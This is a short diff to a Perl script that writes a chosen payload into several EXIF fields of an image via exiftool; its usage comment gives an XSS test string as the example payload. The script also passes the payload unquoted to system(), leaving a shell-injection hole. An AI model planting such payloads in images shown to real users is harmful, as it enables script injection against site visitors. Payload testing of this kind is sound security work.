@@ -1,5 +1,7 @@
 #!/usr/bin/env perl
 
+# Use: perl exifs.pl <image.png> '<script>alert('alert');</script>'
+
 use 5.010;
 use strict;
 use warnings;
@@ -28,11 +30,7 @@ sub main {
         foreach my $exif (@exifs) {
             system ("exiftool -$exif=$payload $image");
         }
-        
-        exit;
     }
-
-    print "Usage: perl exifs.pl <image.png> '<script>alert('alert');</script>'\n";
 }
 
 main();
